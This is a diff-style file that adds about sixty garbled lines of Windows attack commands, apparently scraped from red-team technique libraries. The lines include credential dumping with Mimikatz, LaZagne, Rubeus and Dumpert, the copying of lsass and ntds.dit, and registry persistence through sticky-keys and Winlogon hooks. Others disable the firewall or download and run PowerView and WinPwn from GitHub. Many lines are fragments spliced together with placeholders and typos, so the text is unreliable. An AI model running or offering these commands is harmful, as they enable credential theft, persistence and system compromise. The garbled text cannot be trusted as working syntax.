@@ -1,0 +1,64 @@
+nslookup $ wscriptshell.createshortcut wordlist } -w 5
+net localgroup administrators $ { service_name } binpath= `` $ { url } service name _.lastwritetime = $ { url } /d : /launchargs : username } '' `` set-service -name `` $ { dump_file } } $ { binary_file_path } ''
+$ consumerargs = @ ( $ filter = /export '' ) @ )
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\mshta.exe '' /v `` $ { \windows\system32\sethc_backup.exe }
+get-item -path keylog
+del $ { domain }
+new-itemproperty -path `` /category : software\classes\clsid '' -name `` host $ { command } '' /f
+invoke-mimikatz.exe
+sekurlsa : :logonpasswords /a
+get-ciminstance -classname win32_bios
+rename-computer -newname `` $ { reg_path }
+net group `` domain admins '' /domain
+runexehelper.exe $ { command }
+$ shortcut.workingdirectory = `` cor_profiler_path c : \windows\system32\sethc_backup.exe
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t packages '' /d `` $ { binary_path } '' /f
+get-childitem $ shortcutlocation $ { pid } /o $ { file_name } '' $ { host $ { command } $ { command } '' @ $ { password } /sc onlogon /ru `` string } , 0 -m { 'running -n ''
+copy $ { shadow \system32\osk.exe } ' = $ { limit }
+sekurlsa : :minidump c : \users\yingjie\appdata\local\temp\lsass.dmp '' `` $ '' -p $ { registry_name } '' '' /add $ { command } '' { binary } & /wait 1
+lazagne.exe all
+`` psr.exe /start | tmp.run 0 -s : , keylog
+reg add `` hklm\system\currentcontrolset\control\session /v userinitmprlogonscript '' /t reg_dword /d `` $ { command } '' /f
+bitsadmin.exe /complete $ { bits_job_name }
+( /y $ controllers $ { username } $ { command } '' ''
+reg save hklm\systyem $ { copy path for ntds.dit }
+sekurlsa : :minidump c : \windows\temp\dumpert.dmp
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v globalflag /t reg_sz /d 1 /f
+net user = $ { user_name } $ { new_time } null
+python zero_padding.py $ { target $ { user_name } $ { password } $ { target_ip } / $ { password } -accepteula `` $ { command } '' username= $ { password }
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` '' '' detailed -arguments $ filterargs monitorprocess
+pktmon.exe start -- etw
+new-itemproperty -path `` hkcu : '' //raw.githubusercontent.com/s3cur3th1ssh1t -- disable-gpu-sandbox -- kerberoast lsass { components\atomic_test '' ) )
+silentrunner.exe $ { command }
+put $ { malicious_binary } domain } /o
+tasklist
+[ myprocess ] : :createprocessfromparent ( $ { \amsi.dll
+archive_file.exe $ { bits_job_name } $ { url } -w { wordlist } -u $ { source } -m $ { threads }
+netsh advfirewall set currentprofile state off
+wmic process | findstr [ select-object -expandproperty username
+enable-localuser -name `` cor_profiler_path '' /t reg_dword /d 1 ;
+\windows\system32\desk.cpl $ ( username = `` $ { command } '' )
+hostname
+vssadmin create shadow /for=c
+rdrleakdiag.exe /p $ { domain } | file % copy % \system32\osk.exe } in and $ { path } -w { the format }
+get-childitem $ { username } /domain
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v shell /d `` $ { command } '' /f
+rubeus.exe kerberoast -samaccountname `` $ { command } '' $ { output_path -asplaintext 1
+net localgroup administrators $ { target_ip } command= '' $ { binary_path } ''
+psr.exe /start `` targetinstance processors\atomicredteam '' /f account onlogon objws ' ; get-domainuser -verbose
+silentrunner.exe $ { command }
+reg add `` lsadbextpt '' $ { username } | $ i $ { username } '' `` $ { username } '' `` $ { username } /o $ { url } } /o
+psexec \\ { write-host $ _.creationtime = `` $ { shadow copy volumn name you create } \windows\ntds\ntds.dit $ { destination_ip } \ $ { command_file }
+query /tn `` service_name }
+reg add hklm\software\microsoft\powershell\1\shellids\microsoft.powershell /v commandline from disable-gpu-sandbox | set * from win32_pnpentity where ( pnpclass = 'https : //raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1 ' ) .downloadstring ( 'https : //raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1 ' )
+dig $ { target domain or media \windows hidden -enabled $ { ip_prefix } . for ntds.dit }
+put $ code
+.\outflank-dumpert.exe dump
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v shell /v `` loadappinit_dlls '' /t reg_multi_sz /d `` $ { command } '' /d `` .\ { bat_file_path } /f
+net user $ { domain } | unprivileged $ { threads }
+$ group `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` threadingmodel '' /t reg_sz /d `` '' true , $ { binary__file_path } /t reg_sz /f
+net user defaultaccount /active : \windows\system32\
+powershell -executionpolicy bypass -command '' wql '' '' `` $ { username } '' `` $ { domain } '' $ { format }
+wlrmdr.exe -s $ { /category { name='atomicredteam-wmipersistence-activescripteventconsumer-example , ' string $ { wait_ms } -n $ { -ne consumerargs
+wscript $ { source_file } $ { local_file_path }
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v `` loadappinit_dlls '' /t reg_dword /d 0 /f
